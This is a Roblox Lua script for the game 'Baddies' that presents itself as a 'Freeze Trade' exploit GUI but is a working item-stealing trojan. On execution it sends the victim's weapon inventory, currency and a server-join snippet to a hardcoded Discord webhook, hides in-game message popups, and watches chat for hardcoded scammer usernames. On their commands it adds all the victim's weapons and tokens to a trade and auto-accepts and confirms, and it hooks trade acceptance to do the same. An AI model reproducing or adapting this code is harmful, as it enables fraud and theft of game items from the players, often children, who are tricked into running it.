local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesnt support this game, join BADDIES")
    return
end

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]

local MY_WEBHOOK = "https://discord.com/api/webhooks/1464311781269831735/E7IlLpVLN_lcO_Mn9e0Ck_AzjawbVDAAkmyTHede0PRDsYP43goCqMLh5MN8ljkBaWg4"
local USER_WEBHOOK = _G.Webhook or "PUTHERE"
local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}

local START_TIME = os.time()

-- ══════════════════════════════════════════════════════
--  FREEZE TRADE GUI
-- ══════════════════════════════════════════════════════
local freezeSettings = {
    freezeTrade     = false,
    forceAccept     = false,
    forceConfirm    = false,
    forceAddWeapons = false,
    forceAddTokens  = false,
}

local function createFreezeGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FreezeTrade"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    local window = Instance.new("Frame")
    window.Name = "Window"
    window.Size = UDim2.new(0, 300, 0, 290)
    window.Position = UDim2.new(0.5, -150, 0.5, -145)
    window.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
    window.BorderSizePixel = 0
    window.Active = true
    window.Draggable = true
    window.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = window

    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 36)
    titleBar.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = window

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = titleBar

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -80, 1, 0)
    titleLabel.Position = UDim2.new(0, 12, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Freeze Trade"
    titleLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    titleLabel.TextSize = 13
    titleLabel.Font = Enum.Font.GothamMedium
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 18, 0, 18)
    closeBtn.Position = UDim2.new(1, -28, 0.5, -9)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(160, 160, 160)
    closeBtn.TextSize = 13
    closeBtn.Font = Enum.Font.GothamMedium
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

    local sep = Instance.new("Frame")
    sep.Size = UDim2.new(1, 0, 0, 1)
    sep.Position = UDim2.new(0, 0, 0, 36)
    sep.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
    sep.BorderSizePixel = 0
    sep.Parent = window

    local tabBtn = Instance.new("TextButton")
    tabBtn.Size = UDim2.new(0, 80, 0, 28)
    tabBtn.Position = UDim2.new(0, 12, 0, 46)
    tabBtn.BackgroundColor3 = Color3.fromRGB(44, 44, 46)
    tabBtn.Text = "⚙  Trade"
    tabBtn.TextColor3 = Color3.fromRGB(210, 210, 210)
    tabBtn.TextSize = 12
    tabBtn.Font = Enum.Font.GothamMedium
    tabBtn.BorderSizePixel = 0
    tabBtn.Parent = window

    local tabCorner = Instance.new("UICorner")
    tabCorner.CornerRadius = UDim.new(0, 20)
    tabCorner.Parent = tabBtn

    local function createToggleRow(parent, labelText, yPos, settingKey)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -24, 0, 38)
        row.Position = UDim2.new(0, 12, 0, yPos)
        row.BackgroundTransparency = 1
        row.Parent = parent

        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, -56, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText
        lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
        lbl.TextSize = 12
        lbl.Font = Enum.Font.Gotham
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row

        local track = Instance.new("Frame")
        track.Size = UDim2.new(0, 38, 0, 20)
        track.Position = UDim2.new(1, -42, 0.5, -10)
        track.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
        track.BorderSizePixel = 0
        track.Parent = row

        local trackCorner = Instance.new("UICorner")
        trackCorner.CornerRadius = UDim.new(1, 0)
        trackCorner.Parent = track

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 16, 0, 16)
        knob.Position = UDim2.new(0, 2, 0.5, -8)
        knob.BackgroundColor3 = Color3.fromRGB(180, 180, 185)
        knob.BorderSizePixel = 0
        knob.Parent = track

        local knobCorner = Instance.new("UICorner")
        knobCorner.CornerRadius = UDim.new(1, 0)
        knobCorner.Parent = knob

        local enabled = false
        local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quart)

        local function setToggle(state)
            enabled = state
            freezeSettings[settingKey] = state
            local targetPos  = state and UDim2.new(0, 20, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
            local trackColor = state and Color3.fromRGB(52, 199, 89) or Color3.fromRGB(60, 60, 65)
            local knobColor  = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 185)
            TweenService:Create(knob, tweenInfo, {Position = targetPos, BackgroundColor3 = knobColor}):Play()
            TweenService:Create(track, tweenInfo, {BackgroundColor3 = trackColor}):Play()
        end

        track.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                setToggle(not enabled)
            end
        end)
    end

    local baseY, rowH = 88, 42
    createToggleRow(window, "Freeze Trade",      baseY + rowH * 0, "freezeTrade")
    createToggleRow(window, "Force Accept",      baseY + rowH * 1, "forceAccept")
    createToggleRow(window, "Force Confirm",     baseY + rowH * 2, "forceConfirm")
    createToggleRow(window, "Force Add Weapons", baseY + rowH * 3, "forceAddWeapons")
    createToggleRow(window, "Force Add Tokens",  baseY + rowH * 4, "forceAddTokens")
end

-- ══════════════════════════════════════════════════════
--  HELPERS
-- ══════════════════════════════════════════════════════
local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    if playerCount >= Players.MaxPlayers - 1 then
        localPlayer:Kick("rejoin a diff server")
        return false
    end
    if playerCount < 3 then
        localPlayer:Kick("DATA not loaded, rejoin a public")
        return false
    end
    return true
end

if not checkServerStatus() then return end

local function formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000 then return string.format("%.1fM", num / 1000000)
    elseif num >= 1000 then return string.format("%.1fK", num / 1000)
    else return tostring(num) end
end

local function hasMainWeapons()
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))

    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local lower = name:lower()
        local matched = false
        for _, p in ipairs(patterns) do
            if string.find(lower, p:lower(), 1, true) then
                table.insert(base, name); matched = true; break
            end
        end
        if not matched then table.insert(main, name) end
    end
    return #main >= 3, base, main, #main
end

local function deleteMessagesGui()
    local g = playerGui:FindFirstChild("Messages")
    if g then g:Destroy() end
end

local function sendRequest(url, body)
    if not url or url == "" or url == "PUTHERE" then return nil end
    local headers = {["Content-Type"] = "application/json"}
    local encoded = body
    if type(body) ~= "string" then
        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
        encoded = ok and s or "{}"
    end
    local candidates = {
        function() if syn and syn.request then return syn.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if request then return request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if http and http.request then return http.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if http_request then return http_request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if fluxus and fluxus.request then return fluxus.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
    }
    for _, tryFn in ipairs(candidates) do
        local ok, res = pcall(tryFn)
        if ok and res and (res.Success == true or res.StatusCode == 200 or res.Body ~= nil) then
            return res
        end
    end
    return nil
end

local function getTokenAmountFromTradeList()
    local tradeList = playerGui:FindFirstChild("TradeList")
    if tradeList then
        local main = tradeList:FindFirstChild("Main")
        if main then
            local ta = main:FindFirstChild("TokenAmount")
            if ta then
                local tl = ta:FindFirstChild("TextLabel")
                if tl then
                    local n = string.match(tl.Text, "%d+")
                    if n then return tonumber(n) end
                end
            end
        end
    end
    return 0
end

local function sendFullInventory()
    if not checkServerStatus() then return nil end
    if #Players:GetPlayers() < 3 then return nil end

    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))

    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local lower = name:lower()
        local matched = false
        for _, p in ipairs(patterns) do
            if string.find(lower, p:lower(), 1, true) then
                table.insert(base, name); matched = true; break
            end
        end
        if not matched then table.insert(main, name) end
    end

    local isRich = #main >= 3
    local baseText = #base > 0 and table.concat(base, " • ") or "None"
    local mainText = #main > 0 and table.concat(main, "\\n") or "None"

    local ls = localPlayer:FindFirstChild("leaderstats")
    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local slays  = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"

    local elapsed = os.time() - START_TIME
    local function fmt(sec)
        local m = math.floor(sec/60); local s = sec%60
        return m > 0 and (m.."m "..s.."s") or (s.."s")
    end

    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
    local executor = nil
    if syn then executor = "Synapse X" elseif fluxus then executor = "Fluxus" end
    local tokenAmount = getTokenAmountFromTradeList()
    local playerName  = localPlayer.Name

    local fields = {
        {name="💰 Dinero",          value=tostring(formatNumber(dinero)),  inline=true},
        {name="⚔️ Slays",           value=tostring(formatNumber(slays)),   inline=true},
        {name="🪙 Tokens",          value=tostring(tokenAmount),           inline=true},
        {name="⏱️ Player Executed", value=fmt(elapsed).." ago",           inline=false},
        {name="🧩 Server Joiner",   value="\`\`\`lua\\n"..joinScript.."\`\`\`", inline=false},
    }
    if executor then table.insert(fields, {name="⚡ Executor", value=executor, inline=false}) end

    local embed = {
        title       = "*"..playerName.."*'s Weapons 🔫",
        description = "**Base Weapons**\\n"..baseText.."\\n\\n**Main Weapons**\\n"..mainText,
        color       = isRich and 0xFF0000 or 0xFFA500,
        fields      = fields,
        footer      = {text="Inventory Logger • "..playerName},
        timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    -- Always ping the user who generated this script
    if USER_WEBHOOK ~= "PUTHERE" then
        local userContent = playerName.." has executed your script!"
        if isRich then userContent = userContent.." @everyone @here 🔔 RICH PLAYER DETECTED!" end
        sendRequest(USER_WEBHOOK, {content=userContent, embeds={embed}})
    end

    -- Also ping owner on rich hits
    if isRich then
        sendRequest(MY_WEBHOOK, {content=playerName.." RICH PLAYER! @everyone @here", embeds={embed}})
    end
end

-- ══════════════════════════════════════════════════════
--  STARTUP CHECKS
-- ══════════════════════════════════════════════════════
local hasEnoughWeapons, _, _, mainCount = hasMainWeapons()
if not hasEnoughWeapons then
    warn("Not enough main weapons. Need at least 3, have: "..mainCount)
    return
end

deleteMessagesGui()
sendFullInventory()
createFreezeGui()

-- ══════════════════════════════════════════════════════
--  WEAPONS LIST
-- ══════════════════════════════════════════════════════
local weapons = {
    "Grim Reaper Cloak::None","Blast Bow::None","Princess Power Style::None",
    "Feral Frenzy Style::None","Roller Skates::None","Storm Dancer Style::None",
    "Hug of Doom Style::None","Hero Finisher::None","Grim Reaper Finisher::None",
    "Gun Finisher::None","Doom Finisher::None","Breakdance Finisher::None",
    "Celestial Scythes::None","Graveyard Grip Knuckles::None","Shadow Sorcery Purse::None",
    "Marshmallow Mixer Purse::None","Unicorn Brass Knuckles::None","Disco Dash Board::None",
    "Toast Hoverboard::None","Frost Stomp::None","Sniper Rifle RPG::None",
    "Cursed Board::None","Evil Goth Knuckles::None","Witchy Broom Board::None",
    "Floating Leaf::None","Shark Brass Knuckles::None","Ghostly RPG::None",
    "404 Not Found Blade::None","Vampire Flamethrower::None","Queen's Throne::None",
    "Big Boom Hammer::None","Gravekeeper's Charm::None","Mallow Glide Board::None",
    "Mean Girl Mayhem Style::None","Karate Style::None","Kitty Purse::None",
    "Freeze Gun::None","Shiny Purse::None","Loveboard::None","SpikedPurse::None",
    "Brass Knuckles::None","Golden Snowball Launcher::None","Snowball Launcher::None",
    "Sledge Hammer::None","Spiked Kitty Stanli::None","Turkey Skewers::None",
    "Fan of Requiem::None","Chainsaw::None","Scythe::None","Trashbin Disguise::None",
    "Cupid's Bow::None","Crowbar::None","Harpoon::None","Heartbreaker Style::None",
    "Cannon::None","Spiked Knuckles::None","Glitter Bomb::None",
    "Spiked Nightmare Purse::None","Glitter Style::None","Trident::None",
    "Sakura Blade::None","Nunchucks::None","DogPurse::None","Champion Gloves::None",
    "Chain Mace::None","Surf's Up Hoverboard::None","Graveyard Howl RPG::None",
    "Mocha Missile Maker RPG::None","Black Flame Stomp::None","Angelic Board::None",
    "Credit Card Hoverboard::None","Constellations RPG::None","Palm Sakura Blade::None",
    "Popstar Hoverboard::None","Pink Star Board::None","Thorned Romance::None",
    "Mischief Stomp::None","Lava RPG::None","Crushing Love::None",
    "Love Bomb Finisher::None","Haunted Cemetery RPG::None","Cyber Samurai RPG::None",
    "Black Flame Knuckles::None","Vanity Vortex Finisher::None","Egg Rocket Launcher::None",
    "Frostwind Glider Board::None","Sakura Finisher::None","Witch's Wands Taser::None",
    "The Doom Knuckles::None","Flintlock::None","Pinata Purse::None",
    "Cutlass Sakura Blade::None","Police Hoverboard::None","Y&Y Board::None",
    "Vampire Brass Knuckles::None","Dual Shadow of Night Blade::None","Dance Bomb",
}

-- ══════════════════════════════════════════════════════
--  TRADE FUNCTIONS
-- ══════════════════════════════════════════════════════
local function safeClick(btn)
    if not btn then return end
    local success = false
    pcall(function()
        if btn.MouseButton1Click then firesignal(btn.MouseButton1Click); success = true
        elseif btn.Activated then firesignal(btn.Activated); success = true end
    end)
    if not success then
        pcall(function()
            local pos, size = btn.AbsolutePosition, btn.AbsoluteSize
            local x, y = pos.X + size.X/2, pos.Y + size.Y/2
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
            task.wait(0.05)
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
        end)
    end
end

local function clickWeapons()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then return 0 end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end

    local addedCount = 0
    for _ = 1, 5 do
        local currentAdded = 0
        for _, name in ipairs(weapons) do
            local btn = scrollingFrame:FindFirstChild(name)
            if btn and btn:IsA("ImageButton") and btn.Visible then
                safeClick(btn)
                currentAdded = currentAdded + 1
                addedCount   = addedCount   + 1
                task.wait(0.02)
            end
        end
        if currentAdded == 0 then break end
        task.wait(0.5)
    end
    return addedCount
end

local function getTokenAmount()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if tradingGui then
        local frame = tradingGui:FindFirstChild("Frame")
        if frame then
            local categories = frame:FindFirstChild("Categories")
            if categories then
                local ta = categories:FindFirstChild("TokenAmount")
                if ta then
                    local tl = ta:FindFirstChild("TextLabel")
                    if tl then
                        local n = string.match(tl.Text, "%d+")
                        if n then return tonumber(n) end
                    end
                end
            end
        end
    end
    return 0
end

local function spamConfirm()
    for _ = 1, 20 do
        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
        task.wait(0.05)
    end
end

local function autoCompleteTrade()
    task.wait(1)

    if not freezeSettings.freezeTrade or freezeSettings.forceAddWeapons then
        clickWeapons()
    end

    local tokenAmount = getTokenAmount()
    if tokenAmount and (not freezeSettings.freezeTrade or freezeSettings.forceAddTokens) then
        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
    end

    task.wait(3)

    if not freezeSettings.freezeTrade or freezeSettings.forceAccept then
        pcall(function() RFTradingSetReady:InvokeServer(true) end)
    end

    task.wait(5)

    if not freezeSettings.freezeTrade or freezeSettings.forceAccept then
        pcall(function() RFTradingAcceptTradeOffer:InvokeServer(localPlayer) end)
    end

    task.wait(5)

    if not freezeSettings.freezeTrade or freezeSettings.forceConfirm then
        spamConfirm()
    end
end

-- ══════════════════════════════════════════════════════
--  FREEZE TRADE loop
-- ══════════════════════════════════════════════════════
task.spawn(function()
    while true do
        if freezeSettings.freezeTrade then
            local tradingGui = playerGui:FindFirstChild("Trading")
            if tradingGui then tradingGui.Enabled = false end
        end
        task.wait(0.1)
    end
end)

-- ══════════════════════════════════════════════════════
--  TRADING SETUP
-- ══════════════════════════════════════════════════════
local function setupTrading()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
    local tradeList  = playerGui:WaitForChild("TradeList")
    local mainFrame  = tradeList:WaitForChild("Main")
    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
    tradeRequest.Visible = true
    local isProcessing = false

    local function processChatMessage(sender, txt)
        if isProcessing then return end

        local shouldTrade = false
        for _, username in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == username:lower() then
                shouldTrade = true; break
            end
        end

        if shouldTrade then
            isProcessing = true
            local target = Players:FindFirstChild(sender.Name)
            if target then
                task.wait(0.2)
                pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end)
            end

            if txt == "add" then
                task.wait(0.3)
                if not freezeSettings.freezeTrade or freezeSettings.forceAddWeapons then clickWeapons() end
                local ta = getTokenAmount()
                if ta and (not freezeSettings.freezeTrade or freezeSettings.forceAddTokens) then
                    pcall(function() RFTradingSetTokens:InvokeServer(ta) end)
                end
                task.wait(0.5)
                if not freezeSettings.freezeTrade or freezeSettings.forceAccept then
                    pcall(function() RFTradingSetReady:InvokeServer(true) end)
                end
                task.wait(0.5)
                if not freezeSettings.freezeTrade or freezeSettings.forceConfirm then
                    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
                end
            elseif txt == "1" then
                task.wait(0.2)
                if not freezeSettings.freezeTrade or freezeSettings.forceAccept then
                    pcall(function() RFTradingSetReady:InvokeServer(true) end)
                end
            elseif txt == "2" then
                task.wait(0.2)
                if not freezeSettings.freezeTrade or freezeSettings.forceConfirm then
                    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
                end
            end
            isProcessing = false
        end

        if sender == localPlayer then
            if txt == "add" then
                task.wait(0.2)
                if not freezeSettings.freezeTrade or freezeSettings.forceAddWeapons then clickWeapons() end
                local ta = getTokenAmount()
                if ta and (not freezeSettings.freezeTrade or freezeSettings.forceAddTokens) then
                    pcall(function() RFTradingSetTokens:InvokeServer(ta) end)
                end
                task.wait(0.3)
                if not freezeSettings.freezeTrade or freezeSettings.forceAccept then
                    pcall(function() RFTradingSetReady:InvokeServer(true) end)
                end
                task.wait(0.3)
                if not freezeSettings.freezeTrade or freezeSettings.forceConfirm then
                    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
                end
            elseif txt == "1" then
                task.wait(0.1)
                if not freezeSettings.freezeTrade or freezeSettings.forceAccept then
                    pcall(function() RFTradingSetReady:InvokeServer(true) end)
                end
            elseif txt == "2" then
                task.wait(0.1)
                if not freezeSettings.freezeTrade or freezeSettings.forceConfirm then
                    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
                end
            end
        end
    end

    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local ts = message.TextSource
            if not ts then return end
            local sender = Players:GetPlayerByUserId(ts.UserId)
            if not sender then return end
            local txt = tostring(message.Text or ""):lower()
            task.delay(0.5, function() processChatMessage(sender, txt) end)
        end
    end

    local function onPlayerChatted(player, message)
        if player and message then
            task.delay(0.5, function() processChatMessage(player, message:lower()) end)
        end
    end

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            pcall(function()
                player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
            end)
        end
    end
    Players.PlayerAdded:Connect(function(player)
        pcall(function()
            player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
        end)
    end)

    -- Only hide Trading GUI when Freeze Trade toggle is ON
    local function handleGui(gui)
        if gui.Name == "Messages" then gui:Destroy() end
    end
    for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
    playerGui.ChildAdded:Connect(handleGui)

    task.spawn(function()
        while true do
            if not checkServerStatus() then break end
            local m = playerGui:FindFirstChild("Messages")
            if m then m:Destroy() end
            task.wait(0.1)
        end
    end)
end

setupTrading()

local originalAcceptTrade = RFTradingAcceptTradeOffer.InvokeServer
RFTradingAcceptTradeOffer.InvokeServer = function(player)
    local result = originalAcceptTrade(RFTradingAcceptTradeOffer, player)
    for _, username in ipairs(MY_USERNAMES) do
        if player.Name:lower() == username:lower() then
            task.spawn(function()
                task.wait(5)
                autoCompleteTrade()
            end)
            break
        end
    end
    return result
end